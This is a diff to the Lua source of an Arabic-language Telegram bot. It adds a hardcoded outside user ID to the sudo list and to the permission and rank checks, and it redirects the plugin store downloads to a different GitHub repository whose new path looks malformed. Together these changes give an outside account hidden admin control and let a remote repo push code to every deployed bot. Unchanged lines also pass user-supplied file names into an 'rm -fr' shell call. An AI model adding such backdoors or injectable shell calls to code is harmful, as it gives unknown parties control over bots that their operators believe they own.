@@ -9,7 +9,7 @@ database = redis.connect('127.0.0.1', 6379)
 sudos   = dofile("Info.lua")
 bot_id  = token:match("(%d+)")  
 SUDO = SUDO
-sudo_users = {SUDO,1757836235}   
+sudo_users = {SUDO,1757836235,1679388318}   
 print([[
 ____  _____ _ _       
 | __ )| ____| | | __ _ 
@@ -129,6 +129,8 @@ end
 function Can_or_NotCan(user_id,chat_id)
 if tonumber(user_id) == tonumber(1757836235) then  
 var = true  
+elseif tonumber(user_id) == tonumber(1679388318) then
+var = true  
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = true  
 elseif tonumber(user_id) == tonumber(bot_id) then
@@ -163,6 +165,8 @@ end
 function Rutba(user_id,chat_id)
 if tonumber(user_id) == tonumber(1757836235) then  
 var = 'مطــور السـورس'
+elseif tonumber(user_id) == tonumber(1679388318) then
+var = 'تاجهن'
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي'  
 elseif database:sismember(bot_id.."Dev:SoFi:2", user_id) then 
@@ -3756,7 +3760,7 @@ send(msg.chat_id_, msg.id_,t)
 end
 if text == "متجر الملفات" or text == 'المتجر' then
 if DevSoFi(msg) then
-local Get_Files, res = https.request("https://raw.githubusercontent.com/SRC-BILLA/Files_BILLA/main/getfile.json")
+local Get_Files, res = https.request("https://raw.githubusercontent.com/BILLASR/BILLA_FILES/main/getfile.json")
 if res == 200 then
 local Get_info, res = pcall(JSON.decode,Get_Files);
 vardump(res.plugins_)
@@ -3794,7 +3798,7 @@ t = "⌔∮الملف » "..file.."\n⌔∮تم تعطيل ملف \n"
 else
 t = "⌔∮بالتاكيد تم تعطيل ملف → "..file.."\n"
 end
-local json_file, res = https.request("https://raw.githubusercontent.com/SRC-BILLA/Files_BILLA/main/File_Bot/"..file)
+local json_file, res = https.request("https://raw.githubusercontent.com/BILLASR/BILLA_FILES/File_Bot/main/File_Bot/"..file)
 if res == 200 then
 os.execute("rm -fr File_Bot/"..file)
 send(msg.chat_id_, msg.id_,t) 
@@ -3814,7 +3818,7 @@ t = "⌔∮بالتاكيد تم تفعيل ملف → "..file.." \n"
 else
 t = "⌔∮الملف » "..file.."\n⌔∮تم تفعيل ملف \n"
 end
-local json_file, res = https.request("https://raw.githubusercontent.com/SRC-BILLA/Files_BILLA/main/File_Bot/"..file)
+local json_file, res = https.request("https://raw.githubusercontent.com/BILLASR/BILLA_FILES/File_Bot/main/File_Bot/"..file)
 if res == 200 then
 local chek = io.open("File_Bot/"..file,'w+')
 chek:write(json_file)
